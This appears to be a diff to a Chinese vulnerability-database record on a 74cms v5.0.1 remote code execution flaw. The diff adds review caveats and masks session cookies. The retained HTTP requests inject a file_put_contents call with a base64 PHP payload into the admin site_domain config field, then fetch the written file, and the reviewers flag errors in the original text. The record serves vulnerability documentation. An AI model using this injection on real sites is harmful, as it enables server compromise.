@@ -1,6 +1,42 @@
 ---
 source: "hatch 补库批 20260928"
+product: "74cms"
+record_type: "analysis"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_role: "unknown"
+identifier_status: "unknown"
+title: "74cms v5.0.1远程执行代码"
+prerequisites: "来源所述条件，未列明部分仍待核：5.0.1; authenticated admin config edit; writable config file"
+side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
+source_status: "unknown"
+id: "vw-fd630948b1361d4bd5f643d0"
+entity_id: "ve-fd630948b1361d4bd5f643d0"
+schema_version: "1"
 ---
+
+## 核对与使用边界
+
+- 凭据处理：本文抓包中的可识别会话/防伪或认证值已仅将中段替换为星号，保留首尾及原长度便于对照；遮罩后的历史值不能作为可用登录凭据。原操作、请求方法和攻击表达式保留。
+
+本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。
+
+适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：5.0.1; authenticated admin config edit; writable config file
+
+- **凭据与会话边界（1）**：Headline and empty introduction omit admin requirement visible in route/cookie。抓包中的会话不能视为未认证访问证明；可识别的真实会话值按中段星号遮罩处理，默认演示值和攻击语法保留。需重新取得授权测试会话，不能复用文中值。
+
+- **事实待核（2）**：Text incorrectly describes var_export as HTML entity conversion。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。
+
+- **代码与转录边界（3）**：One file_put_contents excerpt truncates at LOCK_; long translated expressions degraded。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。
+
+- **结论使用边界（4）**：Conf path alternates Home and Common although constants and final request specify Common。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。
+
+- **证据待核（5）**：Images use SQL-article folder; verify identity。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。
+
+历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。
 
 # 74cms v5.0.1远程执行代码
 
@@ -30,7 +66,7 @@ source: "hatch 补库批 20260928"
     X-Requested-With: XMLHttpRequest
     Content-Length: 391
     Connection: close
-    Cookie: PHPSESSID=arm0lvlbbfocml5vvac1tf3ph3; think_language=zh-CN; think_template=default
+    Cookie: PHPSESSID=arm********************ph3; think_language=zh-CN; think_template=default
 
     site_name=%E9%AA%91%E5%A3%AB%E4%BA%BA%E6%89%8D%E7%B3%BB%E7%BB%9F&site_domain=127.0.0.1&site_dir=%2F74cms%2F&top_tel=000-00000000&bootom_tel=000-00000000&contact_email=&address=00%E7%9C%8100%E5%B8%8200%E8%B7%AF00%E5%8F%B70%E5%A4%A7%E5%8E%A600%E6%A5%BC&bottom_other=Copyright+%C2%A9+2019+74cms.com+All+Right+Reserved+&icp=icp000000000&isclose=0&close_reason=&statistics=&logo_home=&logo_other=
 
@@ -241,7 +277,7 @@ file\_put\_contents(\'403.php\',base64\_decode(\'PD9waHAgcGhwaW5mbygpOz8+\')),\'
     X-Requested-With: XMLHttpRequest
     Content-Length: 465
     Connection: close
-    Cookie: PHPSESSID=arm0lvlbbfocml5vvac1tf3ph3; think_language=zh-CN; think_template=default
+    Cookie: PHPSESSID=arm********************ph3; think_language=zh-CN; think_template=default
 
     site_name=%E9%AA%91%E5%A3%AB%E4%BA%BA%E6%89%8D%E7%B3%BB%E7%BB%9F&site_domain='%2C+file_put_contents('403.php'%2Cbase64_decode('PD9waHAgcGhwaW5mbygpOz8%2B'))%2C'&site_dir=%2F74cms%2F&top_tel=000-00000000&bootom_tel=000-00000000&contact_email=&address=00%E7%9C%8100%E5%B8%8200%E8%B7%AF00%E5%8F%B70%E5%A4%A7%E5%8E%A600%E6%A5%BC&bottom_other=Copyright+%C2%A9+2019+74cms.com+All+Right+Reserved+&icp=icp000000000&isclose=0&close_reason=&statistics=&logo_home=&logo_other=
     GET /74cms/Application/Common/Conf/url.php HTTP/1.1
@@ -251,7 +287,7 @@ file\_put\_contents(\'403.php\',base64\_decode(\'PD9waHAgcGhwaW5mbygpOz8+\')),\'
     Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
     Accept-Encoding: gzip, deflate
     Connection: close
-    Cookie: PHPSESSID=arm0lvlbbfocml5vvac1tf3ph3; think_language=zh-CN; think_template=default
+    Cookie: PHPSESSID=arm********************ph3; think_language=zh-CN; think_template=default
     Upgrade-Insecure-Requests: 1
     Cache-Control: max-age=0
 
